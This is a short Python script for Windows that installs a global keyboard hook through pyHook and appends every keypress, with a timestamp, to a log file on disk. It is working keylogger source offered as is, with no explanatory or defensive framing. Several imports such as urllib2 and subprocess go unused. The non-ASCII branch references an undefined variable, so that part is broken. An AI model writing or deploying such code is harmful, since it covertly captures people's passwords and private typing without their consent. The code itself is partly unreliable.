import win32api
import win32con
import win32gui
import pythoncom
import pyHook
import sys
import urllib2
import subprocess
import platform

def OnKeyboardEvent(event):
    if event.Ascii > 0 and event.Ascii < 128:
        keylog = chr(event.Ascii)
    else:
        keylog = str(key)
        
    with open("C:\\logpath\\log.txt", "a") as logfile:
        logfile.write(str(event.Time)+": "+keylog+"\n")
 	
hm = pyHook.HookManager()
hm.KeyDown = OnKeyboardEvent
hm.HookKeyboard()
pythoncom.PumpMessages()

